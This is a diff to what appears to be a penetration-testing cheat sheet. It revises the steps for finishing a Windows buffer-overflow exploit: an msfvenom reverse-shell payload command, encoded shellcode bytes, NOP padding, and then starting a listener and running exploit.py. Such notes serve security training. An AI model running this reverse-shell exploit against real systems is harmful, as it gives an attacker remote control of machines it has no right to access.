@@ -267,9 +267,7 @@ If program is 32 bit, write it backwards. (little endian). For example if the ad
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "<BADCHARS>"
 ```
 
-2. Add a payload variable to the script in parenthese()
-3. Add the payload to the end of the buffer and insert NOPS in-between the return adress and payload
-
+2. Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code
 ```
 payload = (
 "\xba\x9f\x88\x46\xeb\xda\xca\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
@@ -296,10 +294,14 @@ payload = (
 "\x6e\x3b\x03\xb0\xa5\xff\x23\x53\x6f\x0a\xcc\xca\xfa\xb7\x91"
 "\xec\xd1\xf4\xaf\x6e\xd3\x84\x4b\x6e\x96\x81\x10\x28\x4b\xf8"
 "\x09\xdd\x6b\xaf\x2a\xf4")
-
-buffer = "A" * 2003 + "<RETURN\ESP ADRESS>" + "\x90" * 32  + payload
 ```
- 
+3. Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
+```
+padding = "\x90" * 16
+```
+
+4. Start a listener and run exploit.py
+
 # Enumeration
 ## Host Discovery
 #### NMAP ping sweep
